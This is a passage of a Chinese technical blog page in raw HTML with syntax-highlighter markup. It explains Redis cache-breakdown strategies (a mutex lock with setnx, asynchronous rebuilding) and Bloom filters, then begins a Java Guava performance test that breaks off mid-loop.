id=\"crayon-5b623fe195af9840116321-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setnx</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key_mutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"1\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 3 min timeout to avoid mutex holder crash  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">expire</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key_mutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key_mutex</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//其他线程休息50毫秒后重试  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">Thread</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-15\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-16\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n<p><strong>优点:</strong></p>\n<ol>\n<li>思路简单</li>\n<li>保证一致性</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>代码复杂度增大</li>\n<li>存在死锁的风险</li>\n</ol>\n<h3 id=\"异步构建缓存\">2、异步构建缓存</h3>\n<p>在这种方案下，构建缓存采取异步策略，会从线程池中取线程来异步构建缓存，从而不会让所有的请求直接怼到数据库上。该方案redis自己维护一个timeout，当timeout小于System.currentTimeMillis()时，则进行缓存更新，否则直接返回value值。<br>\n集群环境的redis代码如下所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195afe805904849\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nString get(final String key) {  \r\n        V v = redis.get(key);  \r\n        String value = v.getValue();  \r\n        long timeout = v.getTimeout();  \r\n        if (v.timeout &lt;= System.currentTimeMillis()) {  \r\n            // 异步更新后台异常执行  \r\n            threadPool.execute(new Runnable() {  \r\n                public void run() {  \r\n                    String keyMutex = \"mutex:\" + key;  \r\n                    if (redis.setnx(keyMutex, \"1\")) {  \r\n                        // 3 min timeout to avoid mutex holder crash  \r\n                        redis.expire(keyMutex, 3 * 60);  \r\n                        String dbValue = db.get(key);  \r\n                        redis.set(key, dbValue);  \r\n                        redis.delete(keyMutex);  \r\n                    }  \r\n                }  \r\n            });  \r\n        }  \r\n        return value;  \r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195afe805904849-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195afe805904849-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-1\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">V</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getValue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getTimeout</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 异步更新后台异常执行  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">threadPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Runnable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-8\"><span class=\"crayon-h\">                </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-9\"><span class=\"crayon-h\">                    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"mutex:\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-10\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setnx</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"1\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-11\"><span class=\"crayon-h\">                        </span><span class=\"crayon-c\">// 3 min timeout to avoid mutex holder crash  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-12\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">expire</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-13\"><span class=\"crayon-h\">                        </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dbValue</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-14\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dbValue</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-15\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">keyMutex</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-16\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-17\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195afe805904849-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195afe805904849-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p><strong>优点:</strong></p>\n<ol>\n<li>性价最佳，用户无需等待</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>无法保证缓存一致性</li>\n</ol>\n<h3 id=\"布隆过滤器\">3、布隆过滤器</h3>\n<h4 id=\"原理\">1、原理</h4>\n<p>布隆过滤器的巨大用处就是，能够迅速判断一个元素是否在一个集合中。因此他有如下三个使用场景:</p>\n<ol>\n<li>网页爬虫对URL的去重，避免爬取相同的URL地址</li>\n<li>反垃圾邮件，从数十亿个垃圾邮件列表中判断某邮箱是否垃圾邮箱（同理，垃圾短信）</li>\n<li>缓存击穿，将已存在的缓存放到布隆过滤器中，当黑客访问不存在的缓存时迅速返回避免缓存及DB挂掉。</li>\n</ol>\n<p>OK，接下来我们来谈谈布隆过滤器的原理<br>\n其内部维护一个全为0的bit数组，需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。</p>\n<p>假设，根据误判率，我们生成一个10位的bit数组，以及2个hash函数（(f_1,f_2)），如下图所示(生成的数组的位数和hash函数的数量，我们不用去关心是如何生成的，有数学论文进行过专业的证明)。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6aa626ab277b7657acfdd791d67b2af4.png\" alt=\"image\"></p>\n<p>假设输入集合为((N_1,N_2)),经过计算(f_1(N_1))得到的数值得为2，(f_2(N_1))得到的数值为5，则将数组下标为2和下表为5的位置置为1，如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/9dacf0001bc1cd6cb26465d1b752b95f.png\" alt=\"image\"></p>\n<p>同理，经过计算(f_1(N_2))得到的数值得为3，(f_2(N_2))得到的数值为6，则将数组下标为3和下表为6的位置置为1，如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/75b9db0a2fee851bec9d7f6ac505bc63.png\" alt=\"image\"></p>\n<p>这个时候，我们有第三个数(N_3)，我们判断(N_3)在不在集合((N_1,N_2))中，就进行(f_1(N_3)，f_2(N_3))的计算</p>\n<ol>\n<li>若值恰巧都位于上图的红色位置中，我们则认为，(N_3)在集合((N_1,N_2))中</li>\n<li>若值有一个不位于上图的红色位置中，我们则认为，(N_3)不在集合((N_1,N_2))中</li>\n</ol>\n<p>以上就是布隆过滤器的计算原理，下面我们进行性能测试，</p>\n<h4 id=\"性能测试\">2、性能测试</h4>\n<p>代码如下:</p>\n<h5 id=\"新建一个maven工程引入guava包\">(1)新建一个maven工程，引入guava包</h5>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b03477984282\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;dependencies&gt;  \r\n        &lt;dependency&gt;  \r\n            &lt;groupId&gt;com.google.guava&lt;/groupId&gt;  \r\n            &lt;artifactId&gt;guava&lt;/artifactId&gt;  \r\n            &lt;version&gt;22.0&lt;/version&gt;  \r\n        &lt;/dependency&gt;  \r\n    &lt;/dependencies&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b03477984282-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b03477984282-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b03477984282-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b03477984282-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b03477984282-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b03477984282-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b03477984282-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b03477984282-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependencies</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b03477984282-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b03477984282-3\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">guava</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b03477984282-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">guava</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b03477984282-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">22.0</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b03477984282-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b03477984282-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependencies</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p>\n<h5 id=\"测试一个元素是否属于一个百万元素集合所需耗时\">(2)测试一个元素是否属于一个百万元素集合所需耗时</h5>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b06156663493\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage bloomfilter;\r\n\r\nimport com.google.common.hash.BloomFilter;\r\nimport com.google.common.hash.Funnels;\r\nimport java.nio.charset.Charset;\r\n\r\npublic class Test {\r\n    private static int size = 1000000;\r\n\r\n    private static BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size);\r\n\r\n    public static void main(String[] args) {\r\n        for (int i = 0; i &lt; size; i++) {\r\n            bloomFilter.put(i);\r\n        